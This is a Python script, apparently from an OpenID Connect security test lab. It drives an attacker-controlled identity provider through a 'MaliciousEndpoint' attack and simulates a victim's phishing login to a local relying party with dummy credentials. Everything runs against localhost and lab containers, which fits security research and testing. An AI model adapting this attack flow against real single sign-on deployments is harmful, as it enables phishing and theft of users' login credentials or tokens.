import sys
import os
import time

sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

from browser import BrowserSimulator
from attacker_idp import AttackerIdPClient
import id_token

ATTACKER_IDP_ENDPOINT = "http://localhost:3000"
ATTACKER_IDP_ENDPOINT_CONTAINER = "http://attacker-idp:3000"
HONEST_IDP_ENDPOINT = "http://localhost:3001"
HONEST_IDP_ENDPOINT_CONTAINER = "http://honest-idp:3001"
attakcer_idp_client = AttackerIdPClient(ATTACKER_IDP_ENDPOINT)

try:
    # add task to attacker idp
    name = 'MaliciousEndpoint'
    args = {
        'authorization_endpoint': HONEST_IDP_ENDPOINT + '/auth',
        'registration_endpoint':  HONEST_IDP_ENDPOINT_CONTAINER + '/reg'
    }
    task_id = attakcer_idp_client.add_task(name, args)
    print(task_id)

    time.sleep(5)

    sso_flow = """page.locator('input[name="login"]').fill('hoge')
page.locator('input[name="password"]').fill('huga')
page.locator('button[type="submit"]').click()
page.locator('button[type="submit"]').click()
print(page.content())
    """
    
    # fishing login
    simulator = BrowserSimulator(f'http://localhost:5000/login?issuer={ATTACKER_IDP_ENDPOINT_CONTAINER}', 'http://localhost:8080')
    simulator.run(sso_flow)
    simulator.close()

    attakcer_idp_client.delete_task()
except Exception as e:
    print('Error:', e)
    attakcer_idp_client.delete_task()
